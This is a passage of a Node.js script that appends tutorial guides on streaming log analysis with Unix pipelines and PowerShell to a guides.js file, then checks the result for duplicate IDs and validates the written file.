        do: "Understand streaming text processing: never load a multi-gigabyte file into memory.",
        out: "Standard text editors attempt to load the entire 10GB file into RAM, consuming all memory and crashing your computer.\n\nUnix pipe tools (cut, awk, sort, uniq) stream line-by-line using tiny fixed buffers, processing 50GB logs effortlessly on a 4GB RAM machine.",
        note: "The pipeline philosophy: one command extracts the column (`cut`), the second groups matching lines together (`sort`), and the third counts frequencies (`uniq -c`)."
      },
      {
        do: "Find the top 10 IP addresses hammering your web server.",
        cmd: {
          win: "# In Git Bash / WSL:\ncut -d' ' -f1 access.log | sort | uniq -c | sort -rn | head -10\n\n# In PowerShell:\nGet-Content access.log | ForEach-Object { ($_ -split ' ')[0] } | Group-Object | Sort-Object Count -Descending | Select-Object -First 10 Count, Name",
          mac: "cut -d' ' -f1 access.log | sort | uniq -c | sort -rn | head -10"
        },
        out: "  14205 198.51.100.44\n   8901 203.0.113.19\n   4120 192.0.2.8",
        note: "Breakdown of the pipeline:\n  • `cut -d' ' -f1`: split each line by space delimiter (-d' ') and keep only the 1st field (the client IP address)\n  • `sort`: alphabetically sort IPs so duplicates are adjacent (required for uniq)\n  • `uniq -c`: count occurrences of consecutive identical lines\n  • `sort -rn`: sort numerically (-n) in reverse (-r) order (highest counts first)\n  • `head -10`: show the top 10 rows"
      },
      {
        do: "Extract all HTTP 500 and 502 server errors with their requested URLs.",
        cmd: {
          win: "# In Git Bash / WSL:\ngrep -E '\" (500|502) ' access.log | cut -d'\"' -f2 | sort | uniq -c | sort -rn | head -10\n\n# In PowerShell:\nGet-Content access.log | Select-String '\" (500|502) ' | ForEach-Object { ($_ -split '\"')[1] } | Group-Object | Sort-Object Count -Descending | Select-Object -First 10 Count, Name",
          mac: "grep -E '\" (500|502) ' access.log | cut -d'\"' -f2 | sort | uniq -c | sort -rn | head -10"
        },
        out: "    489 POST /api/checkout/charge\n    112 GET /api/users/profile\n     45 POST /api/webhooks/stripe",
        note: "You instantly see that 489 checkout requests failed with 500 errors. You didn't need Datadog, Splunk, or an expensive logging SaaS — a 1-line terminal pipeline gave you the exact failing endpoint."
      },
      {
        do: "Analyze traffic by hour to pinpoint exact time of a traffic spike or DDoS.",
        cmd: {
          win: "# Common log format has timestamps like [07/Sep/2026:14:23:45 +0000]\n# Extract the hour portion (14:xx):\ncut -d: -f2 access.log | cut -d' ' -f1 | sort | uniq -c\n\n# Or in PowerShell:\nGet-Content access.log | ForEach-Object { if ($_ -match ':(\\d{2}):\\d{2}:\\d{2}') { $Matches[1] } } | Group-Object | Sort-Object Name",
          mac: "cut -d: -f2 access.log | cut -d' ' -f1 | sort | uniq -c"
        },
        out: "   1200 12\n   1450 13\n  84210 14  <-- Traffic spiked by 60x at 2:00 PM!\n   1900 15",
        note: "Notice the spike at 14:00 (2 PM) jumping from 1,450 to 84,210 requests. Correlate this timestamp with your application crash logs or database connection spikes."
      },
      {
        do: "Find the slowest API responses from Nginx logs.",
        cmd: {
          win: "# If Nginx log format includes $request_time in the last column ($NF in awk):\nawk '$NF > 2.0 {print $NF, $7}' access.log | sort -rn | head -15",
          mac: "awk '$NF > 2.0 {print $NF, $7}' access.log | sort -rn | head -15"
        },
        out: "  8.412 /api/reports/annual-export\n  6.190 /api/search?q=everything\n  3.840 /api/analytics/dash",
        note: "Filters for all requests taking longer than 2.0 seconds and prints the response time followed by the URL ($7). You now have a prioritized list of slow endpoints to optimize."
      }
    ],
    fix: [
      { p: "uniq -c is not grouping identical lines", s: "Remember that `uniq` only merges ADJACENT duplicate lines! You MUST pass data through `sort` before piping into `uniq`, otherwise duplicate lines scattered across the file will not be counted together." },
      { p: "cut: delimiter must be a single character", s: "The `-d` option in `cut` only accepts single characters (e.g. `-d' '` or `-d','` or `-d'\"'`). If your log uses multi-character delimiters, use `awk -F'::'` instead." }
    ],
    next: ["sed-awk-text-transformation", "jq-json-swiss-army-knife", "read-logs"]
  }

];

console.log('Number of additional hacks to append:', moreHacks.length);

// Verify existing guides
const globalWindow = {};
eval(content.replace('window.TD = window.TD || {}', 'globalWindow.TD = globalWindow.TD || {}'));
const existingGuides = globalWindow.TD.guides;
console.log('Current existing guides:', existingGuides.length);

const existingIds = new Set(existingGuides.map(g => g.id));
for (const g of moreHacks) {
  if (existingIds.has(g.id)) {
    console.error('DUPLICATE ID:', g.id);
    process.exit(1);
  }
  existingIds.add(g.id);
}
console.log('All new IDs are unique! Total will be:', existingIds.size);

// Format guides into clean JavaScript code
function formatGuide(g) {
  let lines = ['    {'];
  lines.push('      id: ' + JSON.stringify(g.id) + ',');
  lines.push('      t: ' + JSON.stringify(g.t) + ',');
  lines.push('      g: ' + JSON.stringify(g.g) + ',');
  lines.push('      mins: ' + g.mins + ',');
  lines.push('      diff: ' + JSON.stringify(g.diff) + ',');
  lines.push('      why: ' + JSON.stringify(g.why) + ',');
  lines.push('      need: ' + JSON.stringify(g.need) + ',');
  if (g.diag) lines.push('      diag: ' + JSON.stringify(g.diag) + ',');
  lines.push('      steps: [');
  g.steps.forEach(function (s, i) {
    let sLines = ['        {'];
    sLines.push('          do: ' + JSON.stringify(s.do));
    if (s.cmd !== undefined) {
      if (typeof s.cmd === 'string') {
        sLines.push(',\n          cmd: ' + JSON.stringify(s.cmd));
      } else {
        sLines.push(',\n          cmd: { win: ' + JSON.stringify(s.cmd.win) + ', mac: ' + JSON.stringify(s.cmd.mac) + ' }');
      }
    }
    if (s.out !== undefined) sLines.push(',\n          out: ' + JSON.stringify(s.out));
    if (s.note !== undefined) sLines.push(',\n          note: ' + JSON.stringify(s.note));
    sLines.push('\n        }');
    lines.push(sLines.join('') + (i < g.steps.length - 1 ? ',' : ''));
  });
  lines.push('      ],');
  lines.push('      fix: [');
  g.fix.forEach(function (f, i) {
    lines.push('        { p: ' + JSON.stringify(f.p) + ', s: ' + JSON.stringify(f.s) + ' }' + (i < g.fix.length - 1 ? ',' : ''));
  });
  lines.push('      ],');
  lines.push('      next: ' + JSON.stringify(g.next));
  lines.push('    }');
  return lines.join('\n');
}

const formattedBlock = ',\n\n' + moreHacks.map(formatGuide).join(',\n\n') + '\n\n';

const closingIdx = content.lastIndexOf('  ];');
if (closingIdx === -1) {
  console.error('Could not find closing bracket in guides.js!');
  process.exit(1);
}

const finalContent = content.slice(0, closingIdx) + formattedBlock + '  ];\n})(window.TD = window.TD || {});\n';
fs.writeFileSync(filePath, finalContent, 'utf8');
console.log('Successfully appended more hacks to guides.js!');

// Final validation
const verifyWindow = {};
eval(finalContent.replace('window.TD = window.TD || {}', 'verifyWindow.TD = verifyWindow.TD || {}'));
console.log('Final verified guide count:', verifyWindow.TD.guides.length);
